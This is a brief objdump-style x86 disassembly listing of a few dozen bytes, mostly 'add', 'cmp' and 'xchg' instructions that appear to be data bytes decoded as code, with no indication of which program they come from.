  404d51:	00 96 00 e1 17 c9    	add    %dl,-0x36e81f00(%esi)
  404d57:	02 26                	add    (%esi),%ah
  404d59:	00 c0                	add    %al,%al
  404d5b:	39 00                	cmp    %eax,(%eax)
  404d5d:	00 00                	add    %al,(%eax)
  404d5f:	00 91 18 df 11 bc    	add    %dl,-0x43ee20e8(%ecx)
  404d65:	01 26                	add    %esp,(%esi)
  404d67:	00 d8                	add    %bl,%al
  404d69:	39 00                	cmp    %eax,(%eax)
  404d6b:	00 00                	add    %al,(%eax)
  404d6d:	00 96 00 50 02 a5    	add    %dl,-0x5afdb000(%esi)
  404d73:	01 26                	add    %esp,(%esi)
  404d75:	00 40 3c             	add    %al,0x3c(%eax)
  404d78:	00 00                	add    %al,(%eax)
  404d7a:	00 00                	add    %al,(%eax)
  404d7c:	91                   	xchg   %eax,%ecx
  404d7d:	00 95 04 6c 06 27    	add    %dl,0x27066c04(%ebp)
  404d83:	00 68 3d             	add    %ch,0x3d(%eax)
  404d86:	00 00                	add    %al,(%eax)
  404d88:	00 00                	add    %al,(%eax)
  404d8a:	91                   	xchg   %eax,%ecx
